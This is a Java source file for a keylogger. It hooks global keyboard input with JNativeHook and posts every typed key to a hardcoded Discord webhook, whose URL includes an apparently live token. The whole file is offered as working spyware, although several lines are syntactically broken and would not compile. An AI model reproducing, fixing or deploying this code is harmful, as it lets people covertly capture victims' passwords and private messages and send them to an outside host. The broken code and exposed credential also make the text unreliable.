package main;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;

//import static sun.security.util.Password.enc;

public class keylogger implements NativeKeyListener {
    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        }catch(NativeHookException e) {
            e.printStackTrace();
        }
        GlobalScreen.getInstance.addNativeKeyListner(new keylogger());
    }
    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        hook(key: "'''" + NativeKeyEvent.getKeyText(e.getKeyCode()) + "'''");
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {

    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {

    }
    private static void hook(String key) {
        PrintWriter out= null;
        BufferedReader in= null;
        StringBuilder vysledok= new StringBuilder();

        try {

            String url="https://discord.com/api/webhooks/1063467178046795827/K38sJNbcn5N_GJbvpmptAiJdgD4FG-l0gIPovSy1vx5Hb7a7Q6Fymm-3DrVay8coGh-P"
            URL kokot= new URL(url);
            URLConnection conn= kokot.openConnection();
            conn.setRequestProperty("accept", "*/*");
            conn.setRequestProperty("connection", "Keep-Alive");
            conn.setRequestProperty("user-agent", "keylogger");
            conn.setDoInput(true);
            conn.setDoOutput(true);
            out= new PrintWriter(conn.getOutputStream());
            String post= URLEncoder.encode(s: "content", enc: "UTF-8") + "=" + URLEncoder.encode(key, enc: "UTF-8");
            out.print(post);
            out.flush();
            in= new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;
            while ((line= in.readLine())!=  null) {
                vysledok.append("/n").append(line);

            }

        }catch (Exception e) {
            e.printStackTrace();
        }finally {
            try{
                if(out!= null) {
                    out.close();
                }
                if(in!= null) {
                    out.close();
                }
            }catch(Exception ex) {
                ex.printStackTrace();
            }
        }
        System.out.println(vysledok.toString());
    }
}
